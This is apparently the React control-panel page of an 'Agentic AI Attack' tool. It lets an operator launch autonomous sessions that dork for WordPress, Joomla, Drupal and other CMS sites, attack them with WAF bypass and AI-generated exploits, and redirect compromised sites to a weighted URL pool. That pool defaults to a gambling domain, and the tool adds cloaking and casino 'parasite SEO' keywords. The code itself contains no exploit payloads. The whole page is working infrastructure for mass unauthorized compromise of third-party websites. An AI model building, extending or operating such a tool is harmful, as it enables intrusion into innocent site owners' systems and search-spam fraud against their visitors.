/**
 * Agentic AI Attack — Fully Autonomous Attack Engine
 * 
 * Features:
 *   - One-click full_auto mode: AI finds targets, attacks, verifies, redirects
 *   - Multi-redirect URL pool management with weights
 *   - Live session monitoring with event stream
 *   - Session history with stats
 *   - Configuration: CMS targets, max concurrent, WAF bypass, AI exploit, cloaking
 */
import React, { useState, useEffect, useMemo, useCallback } from "react";
import { useAuth } from "@/_core/hooks/useAuth";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Progress } from "@/components/ui/progress";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Slider } from "@/components/ui/slider";
import {
  Skull, Brain, Zap, Target, Shield, Activity,
  Loader2, Play, Square, Globe, Plus, Trash2,
  CheckCircle2, XCircle, Clock, Rocket,
  Flame, Crosshair, ExternalLink, RefreshCw,
  Settings2, Power, Link2, Sparkles, BarChart3,
  AlertTriangle, Radio, Eye, Bomb, Radar,
} from "lucide-react";

// ─── Types ───
interface RedirectUrl {
  id: number;
  url: string;
  label: string | null;
  weight: number;
  isActive: boolean;
  isDefault: boolean;
  totalHits: number;
  successHits: number;
  createdAt: string;
}

interface SessionEvent {
  type: string;
  message: string;
  timestamp: number;
  data?: Record<string, unknown>;
}

// ─── Component ───
export default function AgenticAttack() {
  const { user } = useAuth();
  const utils = trpc.useUtils();

  // ─── State ───
  const [activeTab, setActiveTab] = useState("launch");
  const [mode, setMode] = useState<"full_auto" | "semi_auto" | "discovery_only">("full_auto");
  const [maxTargets, setMaxTargets] = useState(50);
  const [maxConcurrent, setMaxConcurrent] = useState(3);
  const [enableWafBypass, setEnableWafBypass] = useState(true);
  const [enableAiExploit, setEnableAiExploit] = useState(true);
  const [enableCloaking, setEnableCloaking] = useState(false);
  const [targetCms, setTargetCms] = useState<string[]>(["wordpress", "joomla", "drupal"]);
  const [customDorks, setCustomDorks] = useState("");
  const [seoKeywords, setSeoKeywords] = useState("");
  const [newRedirectUrl, setNewRedirectUrl] = useState("");
  const [newRedirectLabel, setNewRedirectLabel] = useState("");
  const [newRedirectWeight, setNewRedirectWeight] = useState(1);
  const [selectedSessionId, setSelectedSessionId] = useState<number | null>(null);
  const [pollingEnabled, setPollingEnabled] = useState(false);

  // ─── Queries ───
  const redirectsQuery = trpc.agenticAttack.listRedirects.useQuery();
  const sessionsQuery = trpc.agenticAttack.listSessions.useQuery({ page: 1, limit: 20 });
  const activeCountQuery = trpc.agenticAttack.activeCount.useQuery(undefined, {
    refetchInterval: pollingEnabled ? 5000 : false,
  });

  const sessionStatusQuery = trpc.agenticAttack.getSessionStatus.useQuery(
    { sessionId: selectedSessionId! },
    { enabled: !!selectedSessionId, refetchInterval: pollingEnabled ? 3000 : false }
  );

  // ─── Mutations ───
  const startSession = trpc.agenticAttack.startSession.useMutation({
    onSuccess: (data: any) => {
      toast.success(`🚀 Agentic session #${data.sessionId} started!`);
      setSelectedSessionId(data.sessionId);
      setPollingEnabled(true);
      setActiveTab("monitor");
      utils.agenticAttack.listSessions.invalidate();
      utils.agenticAttack.activeCount.invalidate();
    },
    onError: (err: any) => toast.error(err.message),
  });

  const stopSession = trpc.agenticAttack.stopSession.useMutation({
    onSuccess: () => {
      toast.info("Session stopped");
      utils.agenticAttack.listSessions.invalidate();
      utils.agenticAttack.activeCount.invalidate();
    },
    onError: (err: any) => toast.error(err.message),
  });

  const addRedirect = trpc.agenticAttack.addRedirect.useMutation({
    onSuccess: () => {
      toast.success("Redirect URL added");
      setNewRedirectUrl("");
      setNewRedirectLabel("");
      setNewRedirectWeight(1);
      utils.agenticAttack.listRedirects.invalidate();
    },
    onError: (err: any) => toast.error(err.message),
  });

  const removeRedirect = trpc.agenticAttack.removeRedirect.useMutation({
    onSuccess: () => {
      toast.success("Redirect URL removed");
      utils.agenticAttack.listRedirects.invalidate();
    },
  });

  const updateRedirect = trpc.agenticAttack.updateRedirect.useMutation({
    onSuccess: () => utils.agenticAttack.listRedirects.invalidate(),
  });

  const seedDefaults = trpc.agenticAttack.seedDefaults.useMutation({
    onSuccess: () => {
      toast.success("Default redirect URL seeded");
      utils.agenticAttack.listRedirects.invalidate();
    },
  });

  // ─── Derived ───
  const redirects: RedirectUrl[] = (redirectsQuery.data as any) || [];
  const sessions = (sessionsQuery.data as any)?.sessions || [];
  const totalSessions = (sessionsQuery.data as any)?.total || 0;
  const activeCount = (activeCountQuery.data as any)?.count || 0;
  const sessionStatus = sessionStatusQuery.data as any;

  // Auto-stop polling when session completes
  useEffect(() => {
    if (sessionStatus?.status === "completed" || sessionStatus?.status === "stopped" || sessionStatus?.status === "failed") {
      setPollingEnabled(false);
    }
  }, [sessionStatus?.status]);

  // ─── Handlers ───
  const handleLaunch = useCallback(() => {
    const redirectUrls = redirects.filter((r: RedirectUrl) => r.isActive).map((r: RedirectUrl) => r.url);
    if (redirectUrls.length === 0) {
      toast.error("Add at least one redirect URL first!");
      setActiveTab("redirects");
      return;
    }

    startSession.mutate({
      mode,
      redirectUrls,
      targetCms: targetCms.length > 0 ? targetCms : undefined,
      maxTargetsPerRun: maxTargets,
      maxConcurrent,
      seoKeywords: seoKeywords ? seoKeywords.split(",").map((s: string) => s.trim()).filter(Boolean) : undefined,
      customDorks: customDorks ? customDorks.split("\n").map((s: string) => s.trim()).filter(Boolean) : undefined,
      enableWafBypass,
      enableAiExploit,
      enableCloaking,
    });
  }, [mode, redirects, targetCms, maxTargets, maxConcurrent, seoKeywords, customDorks, enableWafBypass, enableAiExploit, enableCloaking]);

  const handleAddRedirect = () => {
    if (!newRedirectUrl) return;
    try {
      new URL(newRedirectUrl);
    } catch {
      toast.error("Invalid URL");
      return;
    }
    addRedirect.mutate({
      url: newRedirectUrl,
      label: newRedirectLabel || undefined,
      weight: newRedirectWeight,
    });
  };

  const toggleCms = (cms: string) => {
    setTargetCms(prev => prev.includes(cms) ? prev.filter(c => c !== cms) : [...prev, cms]);
  };

  // ─── Render ───
  const cmsOptions = [
    { id: "wordpress", label: "WordPress", icon: "🔵" },
    { id: "joomla", label: "Joomla", icon: "🟠" },
    { id: "drupal", label: "Drupal", icon: "🔷" },
    { id: "magento", label: "Magento", icon: "🟧" },
    { id: "prestashop", label: "PrestaShop", icon: "🟣" },
    { id: "opencart", label: "OpenCart", icon: "🔶" },
    { id: "vbulletin", label: "vBulletin", icon: "🟡" },
    { id: "phpbb", label: "phpBB", icon: "⚫" },
  ];

  return (
    <div className="p-4 lg:p-6 space-y-6 max-w-7xl mx-auto">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-red-500/15 border border-red-500/30 flex items-center justify-center">
              <Skull className="w-5 h-5 text-red-500" />
            </div>
            Agentic AI Attack
          </h1>
          <p className="text-sm text-muted-foreground mt-1">
            Fully autonomous — AI finds targets, attacks with all methods, verifies, and redirects
          </p>
        </div>
        <div className="flex items-center gap-3">
          {activeCount > 0 && (
            <Badge variant="destructive" className="animate-pulse">
              <Radio className="w-3 h-3 mr-1" /> {activeCount} Active
            </Badge>
          )}
        </div>
      </div>

      {/* Quick Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <Card className="bg-card/50 border-border/50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground">Active Sessions</p>
                <p className="text-2xl font-bold text-red-500">{activeCount}</p>
              </div>
              <Activity className="w-8 h-8 text-red-500/30" />
            </div>
          </CardContent>
        </Card>
        <Card className="bg-card/50 border-border/50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground">Total Sessions</p>
                <p className="text-2xl font-bold">{totalSessions}</p>
              </div>
              <BarChart3 className="w-8 h-8 text-muted-foreground/30" />
            </div>
          </CardContent>
        </Card>
        <Card className="bg-card/50 border-border/50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground">Redirect URLs</p>
                <p className="text-2xl font-bold text-emerald-500">{redirects.filter((r: RedirectUrl) => r.isActive).length}</p>
              </div>
              <Link2 className="w-8 h-8 text-emerald-500/30" />
            </div>
          </CardContent>
        </Card>
        <Card className="bg-card/50 border-border/50">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-xs text-muted-foreground">Target CMS</p>
                <p className="text-2xl font-bold text-violet-500">{targetCms.length}</p>
              </div>
              <Target className="w-8 h-8 text-violet-500/30" />
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Main Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="grid grid-cols-4 w-full max-w-lg">
          <TabsTrigger value="launch" className="gap-1.5">
            <Rocket className="w-4 h-4" /> Launch
          </TabsTrigger>
          <TabsTrigger value="redirects" className="gap-1.5">
            <Link2 className="w-4 h-4" /> Redirects
          </TabsTrigger>
          <TabsTrigger value="monitor" className="gap-1.5">
            <Eye className="w-4 h-4" /> Monitor
          </TabsTrigger>
          <TabsTrigger value="history" className="gap-1.5">
            <Clock className="w-4 h-4" /> History
          </TabsTrigger>
        </TabsList>

        {/* ═══════════════════════════════════════════════ */}
        {/* LAUNCH TAB */}
        {/* ═══════════════════════════════════════════════ */}
        <TabsContent value="launch" className="space-y-4 mt-4">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
            {/* Mode Selection */}
            <Card>
              <CardHeader>
                <CardTitle className="text-base flex items-center gap-2">
                  <Brain className="w-4 h-4 text-red-500" /> Attack Mode
                </CardTitle>
                <CardDescription>Choose how autonomous the AI should be</CardDescription>
              </CardHeader>
              <CardContent className="space-y-3">
                {[
                  { value: "full_auto" as const, label: "Full Auto", desc: "AI does everything: find → attack → verify → redirect", icon: Bomb, color: "text-red-500" },
                  { value: "semi_auto" as const, label: "Semi Auto", desc: "AI finds targets, you approve before attacking", icon: Crosshair, color: "text-amber-500" },
                  { value: "discovery_only" as const, label: "Discovery Only", desc: "AI finds vulnerable targets, no attack", icon: Radar, color: "text-blue-500" },
                ].map(opt => (
                  <div
                    key={opt.value}
                    onClick={() => setMode(opt.value)}
                    className={`p-3 rounded-lg border-2 cursor-pointer transition-all ${
                      mode === opt.value
                        ? "border-red-500/50 bg-red-500/5"
                        : "border-border/50 hover:border-border"
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <opt.icon className={`w-5 h-5 ${opt.color}`} />
                      <div>
                        <p className="font-medium text-sm">{opt.label}</p>
                        <p className="text-xs text-muted-foreground">{opt.desc}</p>
                      </div>
                    </div>
                  </div>
                ))}
              </CardContent>
            </Card>

            {/* Configuration */}
            <Card>
              <CardHeader>
                <CardTitle className="text-base flex items-center gap-2">
                  <Settings2 className="w-4 h-4 text-violet-500" /> Configuration
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Max Targets */}
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <Label className="text-sm">Max Targets per Run</Label>
                    <span className="text-sm font-mono text-muted-foreground">{maxTargets}</span>
                  </div>
                  <Slider
                    value={[maxTargets]}
                    onValueChange={([v]) => setMaxTargets(v)}
                    min={5}
                    max={500}
                    step={5}
                  />
                </div>

                {/* Max Concurrent */}
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <Label className="text-sm">Max Concurrent Attacks</Label>
                    <span className="text-sm font-mono text-muted-foreground">{maxConcurrent}</span>
                  </div>
                  <Slider
                    value={[maxConcurrent]}
                    onValueChange={([v]) => setMaxConcurrent(v)}
                    min={1}
                    max={10}
                    step={1}
                  />
                </div>

                {/* Toggles */}
                <div className="space-y-3 pt-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-sm flex items-center gap-2">
                      <Shield className="w-4 h-4 text-amber-500" /> WAF Bypass
                    </Label>
                    <Switch checked={enableWafBypass} onCheckedChange={setEnableWafBypass} />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label className="text-sm flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-violet-500" /> AI Exploit Generator
                    </Label>
                    <Switch checked={enableAiExploit} onCheckedChange={setEnableAiExploit} />
                  </div>
                  <div className="flex items-center justify-between">
                    <Label className="text-sm flex items-center gap-2">
                      <Eye className="w-4 h-4 text-cyan-500" /> Cloaking
                    </Label>
                    <Switch checked={enableCloaking} onCheckedChange={setEnableCloaking} />
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Target CMS Selection */}
          <Card>
            <CardHeader>
              <CardTitle className="text-base flex items-center gap-2">
                <Globe className="w-4 h-4 text-emerald-500" /> Target CMS Platforms
              </CardTitle>
              <CardDescription>Select which CMS platforms to target (empty = all)</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="flex flex-wrap gap-2">
                {cmsOptions.map(cms => (
                  <button
                    key={cms.id}
                    onClick={() => toggleCms(cms.id)}
                    className={`px-3 py-2 rounded-lg border text-sm transition-all ${
                      targetCms.includes(cms.id)
                        ? "border-red-500/50 bg-red-500/10 text-red-400"
                        : "border-border/50 text-muted-foreground hover:border-border"
                    }`}
                  >
                    {cms.icon} {cms.label}
                  </button>
                ))}
              </div>
            </CardContent>
          </Card>

          {/* Advanced: Custom Dorks & SEO Keywords */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
            <Card>
              <CardHeader>
                <CardTitle className="text-sm">Custom Google Dorks (optional)</CardTitle>
                <CardDescription className="text-xs">One per line. AI will also generate its own dorks.</CardDescription>
              </CardHeader>
              <CardContent>
                <textarea
                  value={customDorks}
                  onChange={(e) => setCustomDorks(e.target.value)}
                  placeholder={'inurl:wp-content/uploads\ninurl:administrator/index.php\nsite:.edu inurl:wp-login.php'}
                  className="w-full h-24 bg-muted/30 border border-border/50 rounded-lg p-3 text-sm font-mono resize-none focus:outline-none focus:ring-1 focus:ring-red-500/50"
                />
              </CardContent>
            </Card>
            <Card>
              <CardHeader>
                <CardTitle className="text-sm">SEO Keywords (optional)</CardTitle>
                <CardDescription className="text-xs">Comma-separated. Used for parasite SEO content.</CardDescription>
              </CardHeader>
              <CardContent>
                <textarea
                  value={seoKeywords}
                  onChange={(e) => setSeoKeywords(e.target.value)}
                  placeholder="casino online, sports betting, slot games"
                  className="w-full h-24 bg-muted/30 border border-border/50 rounded-lg p-3 text-sm resize-none focus:outline-none focus:ring-1 focus:ring-red-500/50"
                />
              </CardContent>
            </Card>
          </div>

          {/* Launch Button */}
          <div className="flex justify-center pt-4">
            <Button
              size="lg"
              onClick={handleLaunch}
              disabled={startSession.isPending || redirects.filter((r: RedirectUrl) => r.isActive).length === 0}
              className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-400 text-white px-12 py-6 text-lg rounded-xl shadow-lg shadow-red-500/20 transition-all hover:shadow-red-500/40"
            >
              {startSession.isPending ? (
                <><Loader2 className="w-5 h-5 mr-2 animate-spin" /> Initializing...</>
              ) : (
                <><Flame className="w-5 h-5 mr-2" /> Launch Agentic Attack</>
              )}
            </Button>
          </div>

          {redirects.filter((r: RedirectUrl) => r.isActive).length === 0 && (
            <p className="text-center text-sm text-amber-500 flex items-center justify-center gap-2">
              <AlertTriangle className="w-4 h-4" />
              Add at least one redirect URL in the Redirects tab first
            </p>
          )}
        </TabsContent>

        {/* ═══════════════════════════════════════════════ */}
        {/* REDIRECTS TAB */}
        {/* ═══════════════════════════════════════════════ */}
        <TabsContent value="redirects" className="space-y-4 mt-4">
          <Card>
            <CardHeader>
              <div className="flex items-center justify-between">
                <div>
                  <CardTitle className="text-base flex items-center gap-2">
                    <Link2 className="w-4 h-4 text-emerald-500" /> Redirect URL Pool
                  </CardTitle>
                  <CardDescription>Manage destination URLs for successful attacks. Higher weight = more traffic.</CardDescription>
                </div>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => seedDefaults.mutate()}
                  disabled={seedDefaults.isPending}
                >
                  <RefreshCw className="w-3 h-3 mr-1" /> Seed Default
                </Button>
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* Add New */}
              <div className="flex gap-2 items-end">
                <div className="flex-1 space-y-1">
                  <Label className="text-xs">URL</Label>
                  <Input
                    value={newRedirectUrl}
                    onChange={(e) => setNewRedirectUrl(e.target.value)}
                    placeholder="https://hkt956.org/"
                    className="bg-muted/30"
                  />
                </div>
                <div className="w-32 space-y-1">
                  <Label className="text-xs">Label</Label>
                  <Input
                    value={newRedirectLabel}
                    onChange={(e) => setNewRedirectLabel(e.target.value)}
                    placeholder="Main"
                    className="bg-muted/30"
                  />
                </div>
                <div className="w-20 space-y-1">
                  <Label className="text-xs">Weight</Label>
                  <Input
                    type="number"
                    value={newRedirectWeight}
                    onChange={(e) => setNewRedirectWeight(parseInt(e.target.value) || 1)}
                    min={1}
                    max={100}
                    className="bg-muted/30"
                  />
                </div>
                <Button onClick={handleAddRedirect} disabled={addRedirect.isPending || !newRedirectUrl}>
                  <Plus className="w-4 h-4" />
                </Button>
              </div>

              {/* List */}
              {redirects.length === 0 ? (
                <div className="text-center py-8 text-muted-foreground">
                  <Link2 className="w-12 h-12 mx-auto mb-3 opacity-30" />
                  <p className="text-sm">No redirect URLs yet</p>
                  <p className="text-xs mt-1">Add a URL above or click "Seed Default" for hkt956.org</p>
                </div>
              ) : (
                <div className="space-y-2">
                  {redirects.map((r: RedirectUrl) => (
                    <div
                      key={r.id}
                      className={`flex items-center gap-3 p-3 rounded-lg border transition-all ${
                        r.isActive ? "border-emerald-500/30 bg-emerald-500/5" : "border-border/30 opacity-50"
                      }`}
                    >
                      <Switch
                        checked={r.isActive}
                        onCheckedChange={(checked) => updateRedirect.mutate({ id: r.id, isActive: checked })}
                      />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className="text-sm font-mono truncate">{r.url}</span>
                          {r.isDefault && <Badge variant="secondary" className="text-[10px]">Default</Badge>}
                          <a href={r.url} target="_blank" rel="noopener noreferrer">
                            <ExternalLink className="w-3 h-3 text-muted-foreground hover:text-foreground" />
                          </a>
                        </div>
                        {r.label && <p className="text-xs text-muted-foreground">{r.label}</p>}
                      </div>
                      <div className="text-right shrink-0">
                        <div className="text-xs text-muted-foreground">
                          Weight: <span className="font-mono">{r.weight}</span>
                        </div>
                        <div className="text-xs">
                          <span className="text-emerald-500">{r.successHits}</span>
                          <span className="text-muted-foreground">/{r.totalHits} hits</span>
                        </div>
                      </div>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => removeRedirect.mutate({ id: r.id })}
                        className="text-red-500 hover:text-red-400 hover:bg-red-500/10"
                      >
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════════════════════════════════════════ */}
        {/* MONITOR TAB */}
        {/* ═══════════════════════════════════════════════ */}
        <TabsContent value="monitor" className="space-y-4 mt-4">
          {!selectedSessionId ? (
            <Card>
              <CardContent className="py-12 text-center text-muted-foreground">
                <Radar className="w-16 h-16 mx-auto mb-4 opacity-30" />
                <p className="text-lg font-medium">No Active Session</p>
                <p className="text-sm mt-1">Launch an attack from the Launch tab to start monitoring</p>
              </CardContent>
            </Card>
          ) : (
            <>
              {/* Session Header */}
              <Card>
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className={`w-3 h-3 rounded-full ${
                        sessionStatus?.status === "running" ? "bg-red-500 animate-pulse" :
                        sessionStatus?.status === "completed" ? "bg-emerald-500" :
                        sessionStatus?.status === "stopped" ? "bg-amber-500" :
                        "bg-muted-foreground"
                      }`} />
                      <div>
                        <p className="font-medium">Session #{selectedSessionId}</p>
                        <p className="text-xs text-muted-foreground">
                          Mode: {sessionStatus?.mode || "..."} | Status: {sessionStatus?.status || "loading..."}
                        </p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      {sessionStatus?.status === "running" && (
                        <Button
                          variant="destructive"
                          size="sm"
                          onClick={() => stopSession.mutate({ sessionId: selectedSessionId })}
                          disabled={stopSession.isPending}
                        >
                          <Square className="w-3 h-3 mr-1" /> Stop
                        </Button>
                      )}
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => {
                          setPollingEnabled(!pollingEnabled);
                        }}
                      >
                        {pollingEnabled ? <><Square className="w-3 h-3 mr-1" /> Pause</> : <><Play className="w-3 h-3 mr-1" /> Resume</>}
                      </Button>
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Stats Grid */}
              {sessionStatus?.stats && (
                <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
                  <Card className="bg-card/50">
                    <CardContent className="p-3 text-center">
                      <p className="text-xs text-muted-foreground">Discovered</p>
                      <p className="text-xl font-bold">{sessionStatus.stats.discovered || 0}</p>
                    </CardContent>
                  </Card>
                  <Card className="bg-card/50">
                    <CardContent className="p-3 text-center">
                      <p className="text-xs text-muted-foreground">Attacked</p>
                      <p className="text-xl font-bold text-amber-500">{sessionStatus.stats.attacked || 0}</p>
                    </CardContent>
                  </Card>
                  <Card className="bg-card/50">
                    <CardContent className="p-3 text-center">
                      <p className="text-xs text-muted-foreground">Successful</p>
                      <p className="text-xl font-bold text-emerald-500">{sessionStatus.stats.successful || 0}</p>
                    </CardContent>
                  </Card>
                  <Card className="bg-card/50">
                    <CardContent className="p-3 text-center">
                      <p className="text-xs text-muted-foreground">Failed</p>
                      <p className="text-xl font-bold text-red-500">{sessionStatus.stats.failed || 0}</p>
                    </CardContent>
                  </Card>
                  <Card className="bg-card/50">
                    <CardContent className="p-3 text-center">
                      <p className="text-xs text-muted-foreground">Success Rate</p>
                      <p className="text-xl font-bold text-violet-500">
                        {sessionStatus.stats.attacked > 0
                          ? Math.round((sessionStatus.stats.successful / sessionStatus.stats.attacked) * 100)
                          : 0}%
                      </p>
                    </CardContent>
                  </Card>
                </div>
              )}

              {/* Progress */}
              {sessionStatus?.progress !== undefined && (
                <Card>
                  <CardContent className="p-4">
                    <div className="flex justify-between text-sm mb-2">
                      <span className="text-muted-foreground">{sessionStatus.currentPhase || "Processing..."}</span>
                      <span className="font-mono">{Math.round(sessionStatus.progress || 0)}%</span>
                    </div>
                    <Progress value={sessionStatus.progress || 0} className="h-2" />
                  </CardContent>
                </Card>
              )}

              {/* Event Log */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-base flex items-center gap-2">
                    <Activity className="w-4 h-4 text-cyan-500" /> Live Event Log
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-[400px]">
                    {sessionStatus?.events?.length > 0 ? (
                      <div className="space-y-1.5">
                        {[...(sessionStatus.events || [])].reverse().map((event: SessionEvent, i: number) => (
                          <div key={i} className="flex items-start gap-2 text-xs font-mono">
                            <span className="text-muted-foreground shrink-0 w-20">
                              {new Date(event.timestamp).toLocaleTimeString()}
                            </span>
                            <span className={`shrink-0 w-2 h-2 rounded-full mt-1.5 ${
                              event.type === "success" ? "bg-emerald-500" :
                              event.type === "failed" ? "bg-red-500" :
                              event.type === "attacking" ? "bg-amber-500 animate-pulse" :
                              event.type === "discovering" ? "bg-blue-500" :
                              "bg-muted-foreground"
                            }`} />
                            <span className="text-foreground/80 break-all">{event.message}</span>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="text-center py-8 text-muted-foreground text-sm">
                        Waiting for events...
                      </div>
                    )}
                  </ScrollArea>
                </CardContent>
              </Card>
            </>
          )}
        </TabsContent>

        {/* ═══════════════════════════════════════════════ */}
        {/* HISTORY TAB */}
        {/* ═══════════════════════════════════════════════ */}
        <TabsContent value="history" className="space-y-4 mt-4">
          <Card>
            <CardHeader>
              <CardTitle className="text-base flex items-center gap-2">
                <Clock className="w-4 h-4" /> Session History
              </CardTitle>
            </CardHeader>
            <CardContent>
              {sessions.length === 0 ? (
                <div className="text-center py-8 text-muted-foreground">
                  <Clock className="w-12 h-12 mx-auto mb-3 opacity-30" />
                  <p className="text-sm">No sessions yet</p>
                </div>
              ) : (
                <div className="space-y-2">
                  {sessions.map((session: any) => (
                    <div
                      key={session.id}
                      onClick={() => {
                        setSelectedSessionId(session.id);
                        setPollingEnabled(session.status === "running");
                        setActiveTab("monitor");
                      }}
                      className="flex items-center gap-3 p-3 rounded-lg border border-border/50 hover:border-border cursor-pointer transition-all"
                    >
                      <div className={`w-2.5 h-2.5 rounded-full shrink-0 ${
                        session.status === "running" ? "bg-red-500 animate-pulse" :
                        session.status === "completed" ? "bg-emerald-500" :
                        session.status === "stopped" ? "bg-amber-500" :
                        "bg-muted-foreground"
                      }`} />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className="font-medium text-sm">Session #{session.id}</span>
                          <Badge variant="outline" className="text-[10px]">{session.mode}</Badge>
                          <Badge variant={session.status === "completed" ? "default" : session.status === "running" ? "destructive" : "secondary"} className="text-[10px]">
                            {session.status}
                          </Badge>
                        </div>
                        <p className="text-xs text-muted-foreground mt-0.5">
                          {new Date(session.createdAt).toLocaleString()}
                        </p>
                      </div>
                      <div className="text-right shrink-0">
                        <div className="text-sm">
                          <span className="text-emerald-500 font-mono">{session.successCount || 0}</span>
                          <span className="text-muted-foreground">/{session.totalTargets || 0}</span>
                        </div>
                        <p className="text-[10px] text-muted-foreground">successful</p>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}
